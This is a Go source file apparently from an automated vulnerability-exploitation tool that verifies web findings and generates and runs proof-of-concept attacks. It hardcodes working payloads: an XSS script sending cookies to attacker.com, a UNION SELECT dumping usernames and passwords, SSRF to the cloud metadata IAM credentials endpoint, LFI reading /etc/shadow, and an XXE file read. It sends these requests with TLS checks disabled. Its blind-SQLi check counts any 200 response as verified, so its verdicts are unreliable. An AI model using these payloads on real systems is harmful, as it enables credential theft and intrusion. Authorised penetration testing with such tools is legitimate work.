package validation

import (
	"bytes"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"

	"github.com/samrudh/hack-ai-v2/internal/types"
)

// HTTPExecutor handles HTTP-based PoC execution
type HTTPExecutor struct {
	client *http.Client
}

// NewHTTPExecutor creates a new HTTP executor
func NewHTTPExecutor() *HTTPExecutor {
	return &HTTPExecutor{
		client: &http.Client{
			Timeout: 30 * time.Second,
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{
					InsecureSkipVerify: true, // For testing purposes
				},
			},
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				if len(via) >= 10 {
					return fmt.Errorf("too many redirects")
				}
				return nil
			},
		},
	}
}

// CanHandle checks if this executor can handle the finding
func (e *HTTPExecutor) CanHandle(finding *types.Finding) bool {
	httpTypes := []string{
		"sqli", "xss", "ssrf", "lfi", "rfi", "xxe", "ssti",
		"open_redirect", "header_injection", "crlf",
	}
	
	for _, t := range httpTypes {
		if strings.Contains(strings.ToLower(finding.VulnType), t) {
			return true
		}
	}
	return false
}

// Verify performs secondary verification of the finding
func (e *HTTPExecutor) Verify(ctx context.Context, finding *types.Finding) (*VerifyResult, error) {
	// Generate verification payload based on vuln type
	verifyPayload := e.generateVerifyPayload(finding)
	
	// Build request
	targetURL := finding.URL
	if finding.Parameter != "" && verifyPayload != "" {
		targetURL = e.injectPayload(finding.URL, finding.Parameter, verifyPayload)
	}

	req, err := http.NewRequestWithContext(ctx, finding.Method, targetURL, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to create request: %w", err)
	}

	// Add headers
	for k, v := range finding.Headers {
		req.Header.Set(k, v)
	}

	// Execute request
	resp, err := e.client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("request failed: %w", err)
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)

	// Check for vulnerability indicators
	verified, confidence := e.checkVerification(finding, resp, string(body), verifyPayload)

	return &VerifyResult{
		Verified:   verified,
		Confidence: confidence,
		Method:     "http_replay",
		Details:    fmt.Sprintf("Status: %d, Body length: %d", resp.StatusCode, len(body)),
	}, nil
}

// GeneratePoC creates a proof of concept
func (e *HTTPExecutor) GeneratePoC(ctx context.Context, finding *types.Finding) (*types.PoC, error) {
	poc := &types.PoC{
		Type:        "http",
		Description: fmt.Sprintf("HTTP-based PoC for %s vulnerability", finding.VulnType),
		Steps:       make([]string, 0),
		Payload:     e.generateExploitPayload(finding),
		CreatedAt:   time.Now(),
	}

	// Generate steps
	poc.Steps = append(poc.Steps, fmt.Sprintf("1. Navigate to: %s", finding.URL))
	
	if finding.Parameter != "" {
		poc.Steps = append(poc.Steps, fmt.Sprintf("2. Inject payload into parameter '%s'", finding.Parameter))
		poc.Steps = append(poc.Steps, fmt.Sprintf("3. Payload: %s", poc.Payload))
	}

	// Generate curl command
	poc.CurlCommand = e.generateCurlCommand(finding, poc.Payload)

	return poc, nil
}

// ExecutePoC runs the proof of concept
func (e *HTTPExecutor) ExecutePoC(ctx context.Context, poc *types.PoC) (*ExecuteResult, error) {
	start := time.Now()

	// Parse the payload to get the target URL
	// For now, we'll use a simplified execution
	result := &ExecuteResult{
		Success:     false,
		ExecutionMs: 0,
	}

	// Execute based on PoC type
	if poc.CurlCommand != "" {
		// Execute the curl-equivalent request
		success, response := e.executeCurlEquivalent(ctx, poc)
		result.Success = success
		result.Response = response
	}

	result.ExecutionMs = time.Since(start).Milliseconds()
	return result, nil
}

// generateVerifyPayload creates a verification payload
func (e *HTTPExecutor) generateVerifyPayload(finding *types.Finding) string {
	switch strings.ToLower(finding.VulnType) {
	case "xss", "reflected_xss":
		return `"><script>alert('XSS')</script>`
	case "sqli", "sql_injection":
		return `' OR '1'='1`
	case "ssrf":
		return "http://127.0.0.1:80"
	case "lfi":
		return "../../../../etc/passwd"
	case "ssti":
		return "{{7*7}}"
	case "xxe":
		return `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`
	default:
		return finding.Payload // Use original payload
	}
}

// generateExploitPayload creates an exploitation payload
func (e *HTTPExecutor) generateExploitPayload(finding *types.Finding) string {
	switch strings.ToLower(finding.VulnType) {
	case "xss", "reflected_xss":
		// More impactful XSS payload
		return `"><script>document.location='http://attacker.com/steal?c='+document.cookie</script>`
	case "sqli", "sql_injection":
		// Data extraction payload
		return `' UNION SELECT username,password FROM users--`
	case "ssrf":
		return "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
	case "lfi":
		return "../../../../etc/shadow"
	default:
		return finding.Payload
	}
}

// injectPayload injects payload into URL parameter
func (e *HTTPExecutor) injectPayload(targetURL, param, payload string) string {
	u, err := url.Parse(targetURL)
	if err != nil {
		return targetURL
	}

	q := u.Query()
	q.Set(param, payload)
	u.RawQuery = q.Encode()
	return u.String()
}

// checkVerification checks if the vulnerability was verified
func (e *HTTPExecutor) checkVerification(finding *types.Finding, resp *http.Response, body, payload string) (bool, float64) {
	vulnType := strings.ToLower(finding.VulnType)
	
	switch vulnType {
	case "xss", "reflected_xss":
		// Check if payload is reflected
		if strings.Contains(body, "<script>alert") {
			return true, 0.9
		}
		if strings.Contains(body, payload) {
			return true, 0.7
		}

	case "sqli", "sql_injection":
		// Check for SQL error messages
		sqlErrors := []string{
			"mysql", "syntax error", "ORA-", "PostgreSQL",
			"Microsoft SQL", "sqlite", "SQLSTATE",
		}
		for _, err := range sqlErrors {
			if strings.Contains(strings.ToLower(body), strings.ToLower(err)) {
				return true, 0.8
			}
		}
		// Check for different response (blind SQLi indicator)
		if resp.StatusCode == 200 && len(body) > 0 {
			return true, 0.6
		}

	case "ssrf":
		// Check for internal response indicators
		if strings.Contains(body, "127.0.0.1") || strings.Contains(body, "localhost") {
			return true, 0.85
		}

	case "lfi":
		// Check for file content
		if strings.Contains(body, "root:") && strings.Contains(body, "/bin/") {
			return true, 0.95
		}

	case "ssti":
		// Check for template execution
		if strings.Contains(body, "49") { // 7*7
			return true, 0.9
		}
	}

	return false, 0.0
}

// generateCurlCommand creates a curl command for the PoC
func (e *HTTPExecutor) generateCurlCommand(finding *types.Finding, payload string) string {
	var cmd bytes.Buffer
	cmd.WriteString("curl -k ")

	// Add method
	if finding.Method != "" && finding.Method != "GET" {
		cmd.WriteString(fmt.Sprintf("-X %s ", finding.Method))
	}

	// Add headers
	for k, v := range finding.Headers {
		cmd.WriteString(fmt.Sprintf("-H '%s: %s' ", k, v))
	}

	// Build URL with payload
	targetURL := finding.URL
	if finding.Parameter != "" {
		targetURL = e.injectPayload(finding.URL, finding.Parameter, payload)
	}

	cmd.WriteString(fmt.Sprintf("'%s'", targetURL))
	return cmd.String()
}

// executeCurlEquivalent executes the equivalent of a curl command
func (e *HTTPExecutor) executeCurlEquivalent(ctx context.Context, poc *types.PoC) (bool, string) {
	// Parse curl command to extract URL and options
	// This is a simplified implementation
	
	// Extract URL from curl command
	urlRegex := regexp.MustCompile(`'(https?://[^']+)'`)
	matches := urlRegex.FindStringSubmatch(poc.CurlCommand)
	if len(matches) < 2 {
		return false, "Failed to parse curl command"
	}
	
	targetURL := matches[1]
	
	req, err := http.NewRequestWithContext(ctx, "GET", targetURL, nil)
	if err != nil {
		return false, fmt.Sprintf("Request creation failed: %v", err)
	}

	resp, err := e.client.Do(req)
	if err != nil {
		return false, fmt.Sprintf("Request failed: %v", err)
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	
	// Simple success check - non-error status code
	success := resp.StatusCode >= 200 && resp.StatusCode < 400
	
	return success, string(body)
}
